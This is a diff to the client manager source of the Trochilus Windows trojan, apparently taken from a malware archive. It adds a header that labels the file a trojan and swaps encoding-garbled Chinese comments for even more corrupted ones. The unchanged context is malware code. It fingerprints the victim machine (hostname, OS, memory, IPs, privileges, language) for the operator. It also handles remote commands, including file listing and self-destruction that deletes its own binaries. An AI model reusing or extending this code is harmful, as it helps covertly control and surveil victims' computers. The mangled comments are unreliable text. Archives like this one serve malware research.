@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <time.h>
 #include <wininet.h>
@@ -16,7 +27,7 @@
 #include <atlenc.h>
 
 #pragma comment(lib,"wininet.lib")
-//ÅäÖÃÎÄ¼þÐÅÏ¢
+//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ï¢
 static LPCTSTR INFO_SECTION = TEXT("cid");
 static LPCTSTR CID_KEYNAME = TEXT("cid");
 static LPCTSTR INSTTIME_KEYNAME = TEXT("it");
@@ -40,7 +51,7 @@ BOOL Manager::Init()
 		return FALSE;
 	}
 
-	//¼ÇÂ¼°²×°Ê±¼ä
+	//ï¿½ï¿½Â¼ï¿½ï¿½×°Ê±ï¿½ï¿½
 	GetInstallTime();
 
 	return TRUE;
@@ -150,17 +161,17 @@ BOOL Manager::InitCPGuid()
 	BOOL bSuccess = FALSE;
 	do 
 	{
-		//×¼±¸ÎÄ¼þÂ·¾¶
+		//×¼ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½
 		tstring datFilepath = GetBinFilepath();
 		datFilepath += SERVANT_DATA_FILENAME;
 
-		//¶ÁÈ¡clientid
+		//ï¿½ï¿½È¡clientid
 		TCHAR buffer[MAX_PATH] = {0};
 		::GetPrivateProfileString(INFO_SECTION, CID_KEYNAME, _T(""), buffer, MAX_PATH, datFilepath.c_str());
 		tstring cpguidStr = buffer;
 		trim(cpguidStr);
 
-		//ÊÇ·ñÉú³Éclientid
+		//ï¿½Ç·ï¿½ï¿½ï¿½ï¿½ï¿½clientid
 		CPGUID cpguid;
 		if (cpguidStr.size() == 0 || !Str2CPGuid(cpguidStr.c_str(), cpguid))
 		{
@@ -193,11 +204,11 @@ __time64_t Manager::GetInstallTime()
 
 	if (s_insttime > 0) return s_insttime;
 
-	//×¼±¸ÎÄ¼þÂ·¾¶
+	//×¼ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½
 	tstring datFilepath = GetBinFilepath();
 	datFilepath += SERVANT_DATA_FILENAME;
 
-	//¶ÁÈ¡°²×°Ê±¼ä
+	//ï¿½ï¿½È¡ï¿½ï¿½×°Ê±ï¿½ï¿½
 	TCHAR buffer[MAX_PATH] = {0};
 	::GetPrivateProfileString(INFO_SECTION, INSTTIME_KEYNAME, _T("0"), buffer, MAX_PATH, datFilepath.c_str());
 	UINT64 insttime = 0;
@@ -208,7 +219,7 @@ __time64_t Manager::GetInstallTime()
 		return insttime;
 	}
 
-	//Ã»ÓÐ¼ÇÂ¼°²×°Ê±¼ä£¬Ôò¼ÇÂ¼µ±Ç°Ê±¼ä
+	//Ã»ï¿½Ð¼ï¿½Â¼ï¿½ï¿½×°Ê±ï¿½ä£¬ï¿½ï¿½ï¿½Â¼ï¿½ï¿½Ç°Ê±ï¿½ï¿½
 	_time64(&s_insttime);
 	ZeroMemory(buffer, sizeof(buffer));
 	_stprintf_s(buffer, MAX_PATH, _T("%I64u"), s_insttime);
@@ -321,7 +332,7 @@ typedef struct _PROCESSOR_POWER_INFORMATION {
 
 void Manager::CollectInfo( CommData& data )
 {
-	//»ñÈ¡¼ÆËã»úÃû
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
 	DWORD dwComputerNameSize = MAX_COMPUTERNAME_LENGTH + 1;
 	::GetComputerName(computerName, &dwComputerNameSize);
@@ -330,31 +341,31 @@ void Manager::CollectInfo( CommData& data )
 	std::wstring str;
 	data.GetStrData(_T("cn"),str);
 
-	//»ñÈ¡²Ù×÷ÏµÍ³
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ÏµÍ³
 	WIN_VER_DETAIL winver = GetWindowsVersion();
 	data.SetData(_T("os"), (UINT64)winver);
 
 
-	//»ñÈ¡ÄÚ´æ´óÐ¡
+	//ï¿½ï¿½È¡ï¿½Ú´ï¿½ï¿½Ð¡
 	MEMORYSTATUSEX memStatus = {0};
 	memStatus.dwLength = sizeof(MEMORYSTATUSEX);
 	BOOL isRet = GlobalMemoryStatusEx(&memStatus);
 	int nSizeOfMB = memStatus.ullTotalPhys/(1024*1024);
 	data.SetData(_T("mem"), nSizeOfMB);
 
-	//»ñÈ¡²Ù×÷ÏµÍ³°æ±¾ºÅ
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ÏµÍ³ï¿½æ±¾ï¿½ï¿½
 	std::wstring strVer = GetSystemVersionCode();
 	data.SetData(_T("vercode"), strVer.c_str());
 
-	//¼ì²é²Ù×÷ÏµÍ³Æ½Ì¨
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÏµÍ³Æ½Ì¨
 	BOOL bx64 = IsWow64();
 	data.SetData(_T("x64"), (UINT64)bx64);
 
-	//»ñÈ¡±¾»úIPµØÖ·ÁÐ±í
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½IPï¿½ï¿½Ö·ï¿½Ð±ï¿½
 //	if (m_bFirstRun && GetWindowsVersion() < WINDOWS_VERSION_VISTA)
 // 	{
-// 		//·¢ÏÖÔÚxpÐéÄâ»úÏÂ£¬µÚÒ»´Î°²×°Ê±£¬»ñÈ¡±¾µØÍø¿¨ÐÅÏ¢Ê±»á±ÀÀ££¬ÌáÊ¾²»ÄÜ¶ÔÄ³¸öÄÚ´æµØÖ·Ð´Èë£¬±¨´í´úÂëÎª::GetIpAddrTable(NULL, &dwBytes, TRUE);
-// 		//ÔÝÊ±ÎÞ·¨½â¾ö£¬¹Ê²ÉÓÃ»Ø±Ü·½·¨¡£µÚÒ»´ÎÆô¶¯²¢ÇÒÏµÍ³ÊÇvistaÒÔÏÂÊ±£¬²»½øÐÐ±¾µØip²éÑ¯
+// 		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½xpï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Â£ï¿½ï¿½ï¿½Ò»ï¿½Î°ï¿½×°Ê±ï¿½ï¿½ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾ï¿½ï¿½ï¿½Ü¶ï¿½Ä³ï¿½ï¿½ï¿½Ú´ï¿½ï¿½Ö·Ð´ï¿½ë£¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îª::GetIpAddrTable(NULL, &dwBytes, TRUE);
+// 		//ï¿½ï¿½Ê±ï¿½Þ·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê²ï¿½ï¿½Ã»Ø±Ü·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ÏµÍ³ï¿½ï¿½vistaï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½ï¿½ï¿½ipï¿½ï¿½Ñ¯
 // 		data.SetData(_T("ip"), _T(""));
 // 	}
 // 	else
@@ -372,7 +383,7 @@ void Manager::CollectInfo( CommData& data )
 		data.SetData(_T("ip"), iplistStr.c_str());
 	}
 
-	//»ñÈ¡°²×°Ê±¼ä
+	//ï¿½ï¿½È¡ï¿½ï¿½×°Ê±ï¿½ï¿½
 	LPCTSTR priv = GetProcessUserName(GetCurrentProcessId());
 
 
@@ -381,7 +392,7 @@ void Manager::CollectInfo( CommData& data )
 	data.SetData(_T("priv"),priv);
 	data.SetData(_T("proto"),CommManager::GetInstanceRef().GetDefaultComm());
 
-	//»ñÈ¡ÓïÑÔ°æ±¾
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½Ô°æ±¾
 	data.SetData(_T("lang"),GetSystemDefaultLCID());
 
 	SYSTEM_INFO info;
@@ -829,20 +840,20 @@ BOOL Manager::ExecuteRCCommand_ListFiles( MSGID msgid, const LPBYTE pData, DWORD
 BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, DWORD dwSize, LPVOID lpParameter )
 {
 	Manager* pMgr = (Manager*) lpParameter;
-	//´ýÇåÀíÁÐ±í
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 	TStringVector tocleanList;
 
-	//½«servant¼ÓÈëÇåÀíÁÐ±í
+	//ï¿½ï¿½servantï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 	tstring coreFilepath = GetBinFilepath();
 	coreFilepath += SERVANT_CORE_BINNAME;
 	tocleanList.push_back(coreFilepath);
 
-	//½«Êý¾ÝÎÄ¼þ¼ÓÈëÇåÀíÁÐ±í
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 // 	tstring servantDataFilepath = GetBinFilepath();
 // 	servantDataFilepath += SERVANT_DATA_FILENAME;
 // 	tocleanList.push_back(servantDataFilepath);
 
-	//½øÐÐÎÄ¼þÏú»Ù
+	//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½
 	TStringVector::iterator iter = tocleanList.begin();
 	for (; iter != tocleanList.end(); iter++)
 	{
@@ -855,7 +866,7 @@ BOOL Manager::ExecuteRCCommand_SelfDestruction( MSGID msgid, const LPBYTE data, 
 	DeinitServant();
 
 
-	//ÇåÀíSERVANT_SHELL_BINNAME
+	//ï¿½ï¿½ï¿½ï¿½SERVANT_SHELL_BINNAME
 	tstring shellPath = GetBinFilepath();
 	shellPath += SERVANT_SHELL_BINNAME;
 
